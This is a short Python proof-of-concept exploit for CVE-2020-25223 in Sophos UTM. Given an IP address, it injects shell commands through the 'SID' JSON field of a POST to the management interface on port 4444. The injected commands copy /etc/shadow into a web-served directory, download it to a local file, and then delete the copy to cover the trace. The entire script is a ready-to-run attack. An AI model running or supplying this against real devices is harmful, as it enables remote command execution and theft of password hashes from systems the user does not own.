#!/usr/bin/python3

#A PoC script for testing CVE-2020-25223 against an affected Sophos UTM. 
#Given an IP address, the script attempts to download a copy of the devices /etc/shadow file.
#Original research: https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223

import sys
import requests

#Grab IP as argument
ipaddr = sys.argv[1]

#base URL
url = "https://" + ipaddr + ":4444"

#URL for mgmt interface of affected Sophos
urlvar = "https://" + ipaddr + ":4444/var"

#Set headers for web request.
headers = {
    "Host":ipaddr + ":4444",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Content-Type":"application/json; charset=UTF-8"
    }
 
#Dictionary to send data, with command to copy /etc/shadow file
cmd1 = {
    "SID":"|cat /etc/shadow > /var/sec/chroot-httpd/var/webadmin/shadow.txt|",
    "current_uuid":""
    }

#Send exploit to sophos in a POST request, no need to verify incase of self signed SSL Cert.
x = requests.post(urlvar, headers = headers, json = cmd1, verify = False)
print("-) Sending HTTP POST request")

#Output to screen so I can see wtf is going on.
#print(x.text, "\n")

#Add some code to donwload file
shdw = requests.get(url + "/shadow.txt", headers=headers, verify = False)
print("-) printing shadow file to shadow.txt")
f = open("shadow.txt", "w")
f.write(shdw.text)

#Dictionary to cleanup shadow file
cmd2 = {
    "SID":"|rm /var/sec/chroot-httpd/var/webadmin/shadow.txt|",
    "current_uuid":""
    }
print("-) Cleaning up")
#Cleanup copy of shadow file
y = requests.post(urlvar, headers = headers, json = cmd2, verify = False)
print("-) Done!")
